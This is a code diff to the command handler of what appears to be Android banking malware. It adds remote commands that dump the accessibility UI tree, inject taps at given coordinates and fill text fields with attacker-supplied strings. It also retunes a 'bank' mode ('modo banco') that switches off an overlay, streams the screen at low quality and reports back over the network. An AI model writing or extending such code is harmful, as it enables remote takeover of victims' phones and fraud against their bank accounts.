@@ -9,6 +9,7 @@ import android.provider.Settings;
 import android.view.KeyEvent;
 import android.widget.Toast;
 
+import org.json.JSONArray;
 import org.json.JSONObject;
 
 public final class Cmd {
@@ -55,9 +56,19 @@ public final class Cmd {
                     break;
                 case "bank":
                     Ov.set(c, false);
-                    ScreenSvc.Q = 55;
-                    ScreenSvc.FPS = 8;
-                    Net.send("{\"t\":\"info\",\"o\":\"modo banco: overlay off, 55q 8fps\"}");
+                    ScreenSvc.Q = 30;
+                    ScreenSvc.FPS = 2;
+                    Net.send("{\"t\":\"info\",\"o\":\"modo banco: overlay off, 30q 2fps\"}");
+                    if (acc()) Tree.dump(k);
+                    break;
+                case "tree":
+                    if (acc()) Tree.dump(k);
+                    break;
+                case "tap":
+                    if (acc()) k.touch((float) o.optDouble("x"), (float) o.optDouble("y"));
+                    break;
+                case "fill":
+                    if (acc()) Tree.fill(k, (float) o.optDouble("x"), (float) o.optDouble("y"), o.optString("s"));
                     break;
                 case "q":
                     ScreenSvc.Q = Math.max(15, Math.min(90, o.optInt("v", 38)));
